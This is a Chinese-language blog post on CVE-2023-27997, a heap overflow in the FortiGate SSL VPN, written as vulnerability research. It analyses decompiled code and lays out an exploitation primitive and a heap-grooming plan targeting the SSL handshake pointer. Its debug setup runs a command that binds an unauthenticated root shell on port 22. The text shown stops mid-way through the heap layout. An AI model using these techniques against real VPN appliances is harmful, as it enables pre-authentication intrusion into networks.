<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="CVE-2023-27997">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow">
<meta property="og:url" content="https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:description" content="CVE-2023-27997">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png">
<meta property="article:published_time" content="2023-09-20T16:00:00.000Z">
<meta property="article:modified_time" content="2023-09-21T10:42:18.714Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="CVE-2023-27997">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&text=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&is_video=false&description=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow&body=Check out this article: https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&name=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&t=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">漏洞环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E8%AF%AD"><span class="toc-number">3.1.</span> <span class="toc-text">利用原语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%B8%83%E5%B1%80"><span class="toc-number">3.2.</span> <span class="toc-text">堆布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">3.3.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E6%8C%87%E4%BB%A4"><span class="toc-number">3.4.</span> <span class="toc-text">执行任意指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">4.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">5.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-09-20T16:00:00.000Z" itemprop="datePublished">2023-09-21</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CVE-2023-27997/" rel="tag">CVE-2023-27997</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>由于<code>CVE-2023-27997</code> 漏洞的影响比较大，所以我一直没有公开这篇博客， 但是距离该漏洞公开已经差不多过去了三个月了， 公网的设备应该都修的差不多了吧， 因此这里可以大家分享一下当时我和@leommxj 一起复现该漏洞的笔记。</p>
<p>更具体的漏洞细节可以参考这篇文章： <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">Pre-authentication Remote Code Execution on Fortigate VPN </a>, 而我这里分析版本依旧是 7.2.2</p>
<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>参考可以参考我上一篇文章 《CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow》</p>
<p>在调试的时候 ， 找 @leommxj 和 @explorer 帮我配置了网络环境， 一开始用的是 gdb + vmware 的调试方法，后面改用 gdbserver + gdb 的方法了， 由于 fortigate 的防火墙原因，我们复用了 22 端口 和23 端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 $(pidof sshd) &amp;&amp; .&#x2F;busybox_TELNETD -b 0.0.0.0:22 -l &#x2F;bin&#x2F;sh</span><br><span class="line">kill -9 $(pidof telnetd) &amp;&amp; .&#x2F;gdbserver 0.0.0.0:23 --attach  $(pidof sslvpnd)</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当我们向 fortigate sslvpn 发送一个 <code>enc</code> 的 HTTP 参数的时候, 会进到一个 <code>parse_enc_data</code> 的函数逻辑里. </p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" alt="image.png"></a></p>
<p>另外这个 <code>enc</code> 处理的 URI 有很多可以进来, 包括 <code>/remote/hostcheck_validate</code>  以及 ^[1] 提到的 <code>/remote/logincheck</code> , 具体 URI 的选择,我们后文接着会提到 。这里接着分析  <code>parse_enc_data</code> 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">parse_enc_data</span><span class="params">(__int64 a1, __int64 *pool, <span class="keyword">const</span> <span class="keyword">char</span> *in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  v30 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(in);                              <span class="comment">// in (enc) : AA BB CC DD  XX XX HACKED HACKED ...</span></span><br><span class="line">                                                <span class="comment">//               SEED      SIZE     CIPHERTEXT</span></span><br><span class="line">  int_len = v4;</span><br><span class="line">  lenOfData = v4;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v4 &lt;= <span class="number">11</span> || (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )         <span class="comment">// enc 的长度要大于11, 且偶数</span></span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先进到函数里， 会先判断 <code>enc</code> 参数的值是否长度大于11, 且偶数 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MD5Data(salt, (__int64)in, <span class="number">8</span>, (__int64)md5);</span><br><span class="line">out = (__int16 *)alignedAlloc(*pool, (int_len &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>当符合要求后， 会以长度的 1/2 的大小分配一个 buffer , 然后中间会经过一些数据处理，然后到达另外一个 check</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">out = decodedData_ + <span class="number">2</span>;</span><br><span class="line">xored_given_len = decodedData_[<span class="number">2</span>];</span><br><span class="line">given_len = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);</span><br><span class="line">BYTE1(given_len) = md5[<span class="number">1</span>] ^ HIBYTE(xored_given_len);</span><br><span class="line">payloadLength = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);<span class="comment">// 检查大小</span></span><br><span class="line"><span class="keyword">if</span> ( int_len - <span class="number">5</span> &lt;= payloadLength )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = decodedData_ + <span class="number">3</span>;</span><br><span class="line">  out = v17;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)xored_given_len != md5[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(payloadLength - <span class="number">1</span>);</span><br><span class="line">    i = <span class="number">0L</span>L;</span><br><span class="line">    v20 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v17 + i) ^= md5[v20];    <span class="comment">// bof</span></span><br><span class="line">      <span class="keyword">if</span> ( v18 == i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v20 = ((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = out;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = (__int16 *)((<span class="keyword">char</span> *)out + (<span class="keyword">unsigned</span> __int16)given_len);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这里会将数据的长度（实际传入的长度 ） 和 <code>enc</code> 这个参数定义的 payload 的长度比较， 如果符合  <code>int_len - 5 &lt;= payloadLength</code> ， 即实际长度大于定义的长度， 即接着往下走。 注意这里会出现一个安全问题：</p>
<p>因为实际分配的buffer 的长度应该是实际长度的 1/2 ，而这里却是用原来的长度比较的，因此后面会发生溢出。但是这里的溢出的字节是一个 md5 异或, 这里会对我们后面的利用提出一点点的难度,但是作者却用了一个很巧妙的来完成 。</p>
<p>这里简单总结下这个函数和提炼下 <code>enc</code> 的结构, 首先 <code>enc</code> 参数是一个包含 seed、size（2 个字节）和数据的结构。大小和数据都是加密的。 大致就下图的样子.</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" alt="image.png"></a></p>
<p>seed 存储为 8 个十六进制字符，用于计算 XOR 密钥流的第一个状态：</p>
<p><code>S0 = MD5(salt|seed| &quot;GCC is the GNU Compiler Collection.&quot;)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MD5Data</span><span class="params">(<span class="keyword">char</span> *salt, __int64 enc, <span class="keyword">int</span> size, __int64 output)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">MD5_Init</span><span class="params">(v8)</span></span>;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(salt);</span><br><span class="line">  MD5_Update(v8, salt, v6);</span><br><span class="line">  MD5_Update(v8, enc, size);</span><br><span class="line">  MD5_Update(v8, <span class="string">&quot;GCC is the GNU Compiler Collection.&quot;</span>, <span class="number">35L</span>L);</span><br><span class="line">  MD5_Final(output, v8);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0</span>x</span><br></pre></td></tr></table></figure>

<p>这里的 <code>salt</code> 是由服务器创建的随机值, 可以通过 <code>GET /remote/info HTTP/1.1</code> 获取到 </p>
<p>密钥流的其他状态计算如下：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" alt="image.png"></a><br>函数行为:</p>
<ol>
<li>计算 MD5（16 字节），这是来自盐和种子的密钥的第一个状态（in 的前 8 个字符）</li>
<li>分配大小为 in_len / 2 + 1、out 和十六进制解码输入的缓冲区</li>
<li>通过将有效负载的前两个字节与密钥的前两个字节进行异或运算，计算用户给定的长度 given_len</li>
<li>边界检查：验证给定的长度不大于缓冲区的大小</li>
<li>就地解密整个字符串：对前 14 个字节进行 XOR，然后计算一个新状态 𝐾 1个 ，用它对接下来的 16 个字节进行异或，然后重复。</li>
<li>在解密数据的末尾放置一个 NULL 字节</li>
<li>当程序检查给定长度不大于发送的有效负载的长度时，它会将 in_len 与 given_len 进行比较。但是，前者以十六进制描述有效负载的长度（例如“41424343”），而后者以原始字节描述其大小（例如“ABCD”）。因此，given_len 可以是它应该的两倍大。因此造成了溢出</li>
</ol>
<blockquote>
<p>这里稍微吐槽一下， IDA 的反编译错误导致很多文章对该漏洞的产生原因的描述有些错误</p>
<p><a href="https://twitter.com/bestswngs/status/1670709186509045761">wrong results of Hex-Rays</a></p>
</blockquote>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="利用原语"><a href="#利用原语" class="headerlink" title="利用原语"></a>利用原语</h3><p>首先第一个问题是我们最终选择了  <code>/remote/hostcheck_validate</code>   来做漏洞的触发, 由于漏洞利用原因需要多次请求, 我们如果使用了 <code>/remote/logincheck</code>  容易触发 <code>login-attempt-limit</code> 的限制, 这个默认限制为 2</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" alt="image.png"></a></p>
<p>接着就是利用原语的问题, 这里直接采用了作者提供的方法 ^[2]</p>
<p>大致的核心原理就是使用两次异或, 这样就不会让前面的数值发生混乱.</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" alt="image.png"></a></p>
<p>假设我们要修改 5000偏移的值为 0xff , . 那么我们要溢出两次, 第一次将长度设置为 4999 , 此时溢出结束后会将 5000 位置的值写成 0 , 紧接着第二次用我们计算好的 seed  通过 <code>0xff ^ 0 </code>的方式 , 将5000位置设置成 0xff </p>
<p>按照作者说明就是：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" alt="image.png"></a></p>
<h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><p>我们的目标是去溢出覆盖 SSL 结构中的 <code>handshake_func</code> 指针， 这利用是参考的 orange 当时的一个博客 ^[3]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SSL_do_handshake</span><span class="params">(SSL *s)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">     s-&gt;method-&gt;ssl_renegotiate_check(s, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (SSL_in_init(s) || SSL_in_before(s)) &#123;</span><br><span class="line">         <span class="keyword">if</span> ((s-&gt;mode &amp; SSL_MODE_ASYNC) &amp;&amp; ASYNC_get_current_job() == <span class="literal">NULL</span>) &#123;</span><br><span class="line">             <span class="class"><span class="keyword">struct</span> <span class="title">ssl_async_args</span> <span class="title">args</span>;</span></span><br><span class="line"></span><br><span class="line">             args.s = s;</span><br><span class="line"></span><br><span class="line">             ret = ssl_start_async_job(s, &amp;args, ssl_do_handshake_intern);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             ret = s-&gt;handshake_func(s);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> ret;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>SSL 结构体如下 ^[4]:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,</span></span><br><span class="line"><span class="comment">     * DTLS1_VERSION)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> version;</span><br><span class="line">    <span class="comment">/* SSLv3 */</span></span><br><span class="line">    <span class="keyword">const</span> SSL_METHOD *method;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * There are 2 BIO&#x27;s even though they are normally both the same.  This</span></span><br><span class="line"><span class="comment">     * is so data can be read and written to different handlers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* used by SSL_read */</span></span><br><span class="line">    BIO *rbio;</span><br><span class="line">    <span class="comment">/* used by SSL_write */</span></span><br><span class="line">    BIO *wbio;</span><br><span class="line">    <span class="comment">/* used during session-id reuse to concatenate messages */</span></span><br><span class="line">    BIO *bbio;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This holds a variable that indicates what we were doing when a 0 or -1</span></span><br><span class="line"><span class="comment">     * is returned.  This is needed for non-blocking IO so we know what</span></span><br><span class="line"><span class="comment">     * request needs re-doing when in SSL_accept or SSL_connect</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> rwstate;</span><br><span class="line">    <span class="keyword">int</span> (*handshake_func) (SSL *);</span><br></pre></td></tr></table></figure>


<p>那这的问题就是转化为， 我们如何稳定的将 <code>out</code> 这个缓冲区放置在  SSL 结构体的缓冲区前面， 这样溢出的时候我们才能覆盖到。这里我们参考了部分作者的思路， 在我们这个测试版本中，  SSL 结构的大小为 0x1db8 字节， 他将分配在 0x2000  的缓冲区内 。 另外提一句这里的堆分配器用的是 jemalloc  ， 符合一些后进先出的规则，因此我们的最终思路大概就是：</p>
<p>我们用了 gdb 设置当前 PC 为 <code>je_malloc_stats_print</code> 函数地址，打印当前 <code>jemalloc</code> 的分配情况</p>
